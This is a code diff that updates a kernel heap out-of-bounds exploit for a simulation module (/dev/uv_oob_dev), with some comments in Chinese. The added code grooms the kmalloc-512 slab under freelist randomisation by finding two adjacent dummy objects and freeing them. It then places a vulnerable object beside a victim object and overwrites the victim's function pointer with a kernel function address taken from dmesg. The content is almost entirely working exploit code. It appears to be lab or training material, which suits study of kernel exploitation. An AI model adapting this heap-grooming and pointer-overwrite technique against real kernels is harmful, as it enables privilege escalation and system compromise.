@@ -3,7 +3,9 @@
 #include <string.h>
 #include <fcntl.h>
 #include <unistd.h>
+
 #include "heap_api.h"
+#define BUF_SIZE 		512 
 
 static unsigned long get_bad_addr(void) {
     FILE *fp = popen("dmesg | grep 'bad func'", "r");
@@ -20,42 +22,76 @@ static unsigned long get_bad_addr(void) {
     return addr;
 }
 
-int main(void) {
+#define PROBE_MAX 64
+
+static int helper(int fd, int *out_lo, int *out_hi) {
+    int handles[PROBE_MAX];
+    unsigned long addrs[PROBE_MAX];
+    int n = 0;
+
+    while (n < PROBE_MAX) {
+        if (heap_alloc_dummy(fd, 1, &handles[n]) < 0) {
+            return -1;
+        }
+        if (heap_get_addr(fd, HEAP_OBJ_DUMMY, handles[n], &addrs[n]) < 0) {
+            return -1;
+        }
+
+        for (int k = 0; k < n; k++) {
+            unsigned long a = addrs[k], b = addrs[n];
+            int ha = handles[k], hb = handles[n];
+
+            if ((a & ~0xFFFUL) != (b & ~0xFFFUL)) continue;
+
+            if (a + BUF_SIZE == b) { *out_lo = ha; *out_hi = hb; return 1; }
+            if (b + BUF_SIZE == a) { *out_lo = hb; *out_hi = ha; return 1; }
+        }
+        n++;
+    }
+    return 0;
+}
+
+int main() {
     int fd = open("/dev/uv_oob_dev", O_RDWR);
     if (fd < 0) {
         printf("[-] Failed to open device\n");
         return -1;
     }
+    int idx_lo, idx_hi;
+    int vul_idx, victim_idx;
 
-    int vulobj_idx;
-    int victim_idx;
-
-    printf("[*] Kernel OOB Exploit Simulation\n");
+    printf("[*] Kernel OOB Exploit with CONFIG_FREELIST_RANDOM on Simulation\n");
 
     unsigned long bad_func_addr = get_bad_addr();
     if (bad_func_addr == 0) {
         printf("[-] Failed to find bad_function address from dmesg.\n");
         printf("[-] Ensure the module is loaded and dmesg has the address.\n");
-        close(fd);
         return -1;
     }
     printf("[+] Found bad_function address: 0x%lx\n", bad_func_addr);
 
     printf("[+] Defragmenting kmalloc-512...\n");
-    if (heap_defrag(fd) < 0) {
+    if(heap_defrag(fd) < 0) {
         close(fd);
-        return -1;
+        return 1;
+    }
+    
+    // 不断分配dummy_obj，直到找到两个相邻的dummy_obj
+    if (helper(fd, &idx_lo, &idx_hi) != 1) {
+        printf("[-] failed to find adjacent dummy pair\n");
+        close(fd);
+        return 1;
     }
 
-    if (heap_alloc_vul(fd, 1, &vulobj_idx) < 0) {
-        close(fd);
-        return -1;
-    }
+    printf("[+] Found two adjacent dummy_obj: low=%d  high=%d\n", idx_lo, idx_hi);
+    
+    // 依次释放这两个相邻的dummy_obj
+    heap_free_dummy(fd, idx_hi);
+    heap_free_dummy(fd, idx_lo);
 
-    if (heap_alloc_victim(fd, 1, &victim_idx) < 0) {
-        close(fd);
-        return -1;
-    }
+    // 依次分配一个vul_obj和一个victim_obj，这样恰好相邻
+    heap_alloc_vul(fd, 1, &vul_idx);
+    heap_alloc_victim(fd, 1, &victim_idx);
 
     printf("[+] Dumping victim before overwrite...\n");
     heap_read_victim(fd, victim_idx);
@@ -69,7 +105,7 @@ int main(void) {
     printf("[+] Overwriting funptr with bad_function address...\n");
     for (int i = 0; i < (int)sizeof(unsigned long); i++) {
         char b = (char)((bad_func_addr >> (i * 8)) & 0xFF);
-        if (heap_write_vul(fd, vulobj_idx, 512 + i, b) < 0) {
+        if (heap_write_vul(fd, vul_idx, 512 + i, b) < 0) {
             close(fd);
             return -1;
         }
@@ -84,7 +120,6 @@ int main(void) {
         close(fd);
         return -1;
     }
-    printf("[+] Execute command sent. Run 'dmesg | tail' to check if 'bad' was printed!\n");
 
     close(fd);
     return 0;
